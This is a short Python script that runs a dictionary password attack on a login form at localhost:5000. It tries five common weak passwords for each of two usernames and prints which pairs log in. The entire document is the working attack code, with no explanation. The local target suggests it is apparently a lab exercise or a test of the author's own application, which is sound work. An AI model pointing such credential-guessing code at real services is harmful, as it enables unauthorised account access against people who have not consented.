import requests

url = 'http://localhost:5000/login'
usernames = ['user1', 'user2']
passwords = ['password1', 'password2', 'password123', 'letmein', 'admin']

for username in usernames:
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if "Invalid credentials!" not in response.text:
            print(f"Successful login with {username}:{password}")
        else:
            print(f"Failed login with {username}:{password}")